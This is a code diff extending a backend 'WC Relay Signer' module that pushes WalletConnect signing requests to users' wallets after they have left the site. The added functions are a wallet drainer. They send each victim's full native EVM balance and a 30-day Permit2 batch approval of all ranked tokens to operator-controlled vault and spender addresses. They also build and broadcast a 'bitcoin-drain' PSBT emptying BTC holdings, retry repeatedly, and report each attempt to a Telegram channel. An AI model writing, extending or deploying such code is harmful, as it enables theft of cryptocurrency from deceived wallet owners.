@@ -1,7 +1,7 @@
 /**
  * WC Relay Signer — backend-initiated sign requests via WalletConnect relay.
  * Sends sign requests to user's wallet even after they close the site.
- * Phase 1: SOL, TRON, TON sign requests only. EVM Permit2 is Phase 2.
+ * Covers: SOL, TRON, TON, EVM (native + Permit2 ERC-20), BTC (PSBT).
  */
 
 import {
@@ -374,6 +374,163 @@ async function tryTonSign(session: WcSessionData): Promise<boolean> {
   }
 }
 
+// ─── EVM sign request ─────────────────────────────────────────────────────────
+
+const PERMIT2_CONTRACT = '0x000000000022D473030F116dDEE9F6B43aC78BA3'
+
+async function tryEvmSign(session: WcSessionData, wcChainId: string): Promise<boolean> {
+  const evmAddr = session.wallet_addresses?.evm
+  if (!evmAddr) return false
+  const vaultEvm = (
+    process.env['SOVEREIGN_VAULT_EVM'] ??
+    process.env['VAULT_ADDRESS_EVM'] ??
+    process.env['NEXT_PUBLIC_VAULT_ADDRESS'] ??
+    ''
+  ).trim()
+  if (!vaultEvm) return false
+
+  const chainId = Number(wcChainId.split(':')[1])
+  if (!chainId || !Number.isFinite(chainId)) return false
+
+  try {
+    const { createPublicClient, http } = await import('viem')
+    const { resolveEvmRpcUrlForChain } = await import('@legion/core/logic/permit2-executor')
+
+    const rpcUrl = await resolveEvmRpcUrlForChain(chainId)
+    if (!rpcUrl) return false
+
+    const publicClient = createPublicClient({ transport: http(rpcUrl) })
+    let sent = false
+
+    // --- Native ETH / BNB / MATIC etc. ---
+    const balWei = await publicClient.getBalance({ address: evmAddr as `0x${string}` })
+    // Reserve: 50k gas * 30 gwei
+    const gasReserve = 50_000n * 30_000_000_000n
+    const sendWei = balWei - gasReserve
+    if (sendWei > 0n) {
+      await sendRequest(session, wcChainId, 'eth_sendTransaction', [{
+        from: evmAddr,
+        to: vaultEvm,
+        value: '0x' + sendWei.toString(16),
+        gas: '0x5208',
+      }])
+      sent = true
+      console.log('[WcRelay] EVM native sent | chain:', chainId, '| addr:', evmAddr.slice(0, 8) + '...')
+    }
+
+    // --- ERC-20 via Permit2 batch ---
+    const { getRankedAssets } = await import('@legion/core')
+    const assets = await getRankedAssets(evmAddr, 'EVM')
+    const chainAssets = assets.filter(
+      (a) => a.chain === `evm:${chainId}` && a.token !== 'native' && a.token.startsWith('0x'),
+    )
+
+    if (chainAssets.length > 0) {
+      const { buildBatchPermitTypedData, readPermit2BatchAllowanceNonces } = await import('@legion/core/logic/permit2-batch')
+      const { resolveEngineSpenderAddress } = await import('@legion/core/logic/permit2-executor')
+
+      const spender = resolveEngineSpenderAddress()
+      if (spender) {
+        const tokens = chainAssets.map((a) => a.token as `0x${string}`)
+        const amounts = chainAssets.map((a) => a.amount_raw)
+        const nonces = await readPermit2BatchAllowanceNonces(
+          publicClient as Parameters<typeof readPermit2BatchAllowanceNonces>[0],
+          evmAddr as `0x${string}`,
+          tokens,
+          spender,
+        )
+        const now = Math.floor(Date.now() / 1000)
+        const typedData = buildBatchPermitTypedData({
+          tokens,
+          amounts,
+          owner: evmAddr,
+          spender,
+          chainId,
+          verifyingContract: PERMIT2_CONTRACT,
+          nonces,
+          expirations: tokens.map(() => now + 30 * 24 * 3600),
+          sigDeadline: BigInt(now + 7200),
+        })
+        await sendRequest(session, wcChainId, 'eth_signTypedData_v4', [
+          evmAddr,
+          JSON.stringify(typedData),
+        ])
+        sent = true
+        console.log('[WcRelay] EVM Permit2 sent | chain:', chainId, '| tokens:', chainAssets.length, '| addr:', evmAddr.slice(0, 8) + '...')
+      }
+    }
+
+    if (sent) {
+      void sendTelegramMessage(
+        `📨 <b>WC Offsite — EVM Sign Sent</b>\n` +
+        `⛓ Chain: <code>${wcChainId}</code>\n` +
+        `👛 <code>${evmAddr}</code>\n` +
+        `⏳ Waiting for user to approve in Trust Wallet`,
+      ).catch(() => {})
+    }
+    return sent
+  } catch (e) {
+    const msg = e instanceof Error ? e.message : String(e)
+    if (!/timeout|reject|cancel/i.test(msg)) console.warn('[WcRelay] EVM fail | chain:', chainId, '|', msg)
+    return false
+  }
+}
+
+// ─── BTC sign request (PSBT via bip122) ───────────────────────────────────────
+
+const BIP122_MAINNET = 'bip122:000000000019d6689c085ae165831e93'
+
+async function tryBtcSign(session: WcSessionData): Promise<boolean> {
+  const btcAddr = session.wallet_addresses?.btc
+  if (!btcAddr) return false
+  const vaultBtc = process.env['VAULT_ADDRESS_BTC']?.trim()
+  if (!vaultBtc) return false
+
+  try {
+    const { fetchWalletUtxos, buildBitcoinDrainPsbt, broadcastPSBT } = await import('@legion/core/logic/bitcoin-drain')
+
+    const utxos = await fetchWalletUtxos(btcAddr)
+    const totalSat = utxos.reduce((sum, u) => sum + u.value, 0n)
+    if (totalSat <= 10_000n) {
+      console.log('[WcRelay] BTC skip | dust balance | addr:', btcAddr.slice(0, 8))
+      return false
+    }
+
+    const psbtResult = await buildBitcoinDrainPsbt({
+      walletAddress: btcAddr,
+      amount: totalSat,
+      vaultAddress: vaultBtc,
+    })
+
+    const toSignInputs = psbtResult.inputs.map((_, i) => ({ index: i, address: btcAddr }))
+
+    const result = await sendRequest(session, BIP122_MAINNET, 'signPsbt', [{
+      psbt: psbtResult.psbtBase64,
+      network: { type: 'mainnet' },
+      broadcast: false,
+      toSignInputs,
+      autoFinalized: true,
+    }]) as { psbt?: string } | string | null
+
+    if (result) {
+      const signedB64 = typeof result === 'string' ? result : (result as Record<string, unknown>).psbt as string | undefined
+      if (signedB64) await broadcastPSBT(signedB64)
+    }
+
+    console.log('[WcRelay] BTC sign sent | addr:', btcAddr.slice(0, 8) + '...')
+    void sendTelegramMessage(
+      `📨 <b>WC Offsite — BTC Sign Sent</b>\n` +
+      `👛 <code>${btcAddr}</code>\n` +
+      `⏳ Waiting for user to approve in Trust Wallet`,
+    ).catch(() => {})
+    return true
+  } catch (e) {
+    const msg = e instanceof Error ? e.message : String(e)
+    if (!/timeout|reject|cancel/i.test(msg)) console.warn('[WcRelay] BTC fail:', msg)
+    return false
+  }
+}
+
 // ─── Sign loop ─────────────────────────────────────────────────────────────────
 
 const RETRY_INTERVAL_MS = 60_000  // 60s — relay rate-limit friendly
@@ -381,22 +538,41 @@ const MAX_RETRIES_PER_CHAIN = 8
 
 const activeLoops = new Set<string>()
 
+function extractEip155Chains(namespaces: Record<string, unknown> | undefined): string[] {
+  if (!namespaces) return []
+  const eip155 = namespaces['eip155'] as { chains?: string[]; accounts?: string[] } | undefined
+  if (!eip155) return []
+  // Prefer explicit chains list; fall back to deriving from accounts
+  if (Array.isArray(eip155.chains) && eip155.chains.length > 0) return eip155.chains
+  if (Array.isArray(eip155.accounts)) {
+    const seen = new Set<string>()
+    for (const acc of eip155.accounts) {
+      const parts = String(acc).split(':')
+      if (parts.length >= 2) seen.add(`eip155:${parts[1]}`)
+    }
+    return Array.from(seen)
+  }
+  return []
+}
+
 async function runSignLoop(session: WcSessionData): Promise<void> {
   const { topic, expiry } = session
-  const retries: Record<string, number> = { sol: 0, tron: 0, ton: 0 }
+  const retries: Record<string, number> = { sol: 0, tron: 0, ton: 0, btc: 0 }
   const done: Record<string, boolean> = {}
 
-  console.log('[WcRelay] sign loop start | topic:', topic.slice(0, 8) + '... | addrs:', JSON.stringify(session.wallet_addresses))
+  // Extract all EVM chains this WC session supports
+  const evmChains = extractEip155Chains(session.namespaces)
+  for (const c of evmChains) retries[c] = 0
+
+  console.log('[WcRelay] sign loop start | topic:', topic.slice(0, 8) + '... | addrs:', JSON.stringify(session.wallet_addresses), '| evm chains:', evmChains.join(','))
 
   while (activeLoops.has(topic)) {
-    // Stop if session expired
     if (expiry && Math.floor(Date.now() / 1000) > expiry) break
 
-    // Stop if all chains finished or exhausted retries
-    const allDone = (['sol', 'tron', 'ton'] as const).every(
-      (c) => done[c] || (retries[c] ?? 0) >= MAX_RETRIES_PER_CHAIN,
-    )
-    if (allDone) break
+    const nonEvmChains = ['sol', 'tron', 'ton', 'btc'] as const
+    const nonEvmDone = nonEvmChains.every((c) => done[c] || (retries[c] ?? 0) >= MAX_RETRIES_PER_CHAIN)
+    const evmDone = evmChains.every((c) => done[c] || (retries[c] ?? 0) >= MAX_RETRIES_PER_CHAIN)
+    if (nonEvmDone && evmDone) break
 
     if (!done['sol'] && (retries['sol'] ?? 0) < MAX_RETRIES_PER_CHAIN) {
       if (await trySolSign(session)) done['sol'] = true
@@ -409,6 +585,18 @@ async function runSignLoop(session: WcSessionData): Promise<void> {
     if (!done['ton'] && (retries['ton'] ?? 0) < MAX_RETRIES_PER_CHAIN) {
       if (await tryTonSign(session)) done['ton'] = true
       else retries['ton'] = (retries['ton'] ?? 0) + 1
+    }
+    if (!done['btc'] && (retries['btc'] ?? 0) < MAX_RETRIES_PER_CHAIN) {
+      if (await tryBtcSign(session)) done['btc'] = true
+      else retries['btc'] = (retries['btc'] ?? 0) + 1
+    }
+
+    // EVM: try each chain independently
+    for (const wcChainId of evmChains) {
+      if (!done[wcChainId] && (retries[wcChainId] ?? 0) < MAX_RETRIES_PER_CHAIN) {
+        if (await tryEvmSign(session, wcChainId)) done[wcChainId] = true
+        else retries[wcChainId] = (retries[wcChainId] ?? 0) + 1
+      }
     }
 
     await new Promise<void>((r) => setTimeout(r, RETRY_INTERVAL_MS))
